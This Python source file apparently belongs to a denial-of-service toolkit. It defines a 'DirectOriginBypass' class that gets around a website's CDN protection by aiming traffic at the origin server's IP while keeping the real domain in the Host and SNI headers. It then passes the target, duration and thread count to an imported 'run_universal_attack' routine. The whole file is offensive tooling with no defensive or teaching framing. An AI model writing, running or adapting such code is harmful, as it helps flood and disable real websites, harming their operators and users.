import socket
import logging
import asyncio
import aiohttp
from typing import List, Dict

class DirectOriginBypass:
    """
    Phase 2.1: Direct Origin Attack.
    Bypasses CDN by attacking the Origin IP directly with correct Host header.
    """
    def __init__(self, origin_ip: str, target_domain: str):
        self.origin_ip = origin_ip
        self.domain = target_domain.replace("https://", "").replace("http://", "").split("/")[0]
        self.logger = logging.getLogger("OriginBypass")

    async def run_attack(self, duration: int, threads: int):
        self.logger.info(f"[!] Launching DIRECT-TO-ORIGIN Attack on {self.origin_ip} [!]")
        self.logger.info(f"[*] Target: {self.domain} | Duration: {duration}s | Threads: {threads}")
        
        # Use Go Engine for high-performance direct attack if available
        # Otherwise use Python ultra_worker
        from src.core.universal_attack import run_universal_attack
        
        # We spoof the connection by passing the Origin IP to the orchestrator
        # but keeping the Domain for Host/SNI headers.
        recon_data = {
            "dns_analysis": {"a_records": [self.origin_ip]},
            "ip_intelligence": {"origin_ip_discovery": {"confirmed_origin_ips": [self.origin_ip]}}
        }
        
        await run_universal_attack(self.domain, duration, threads, recon_data)
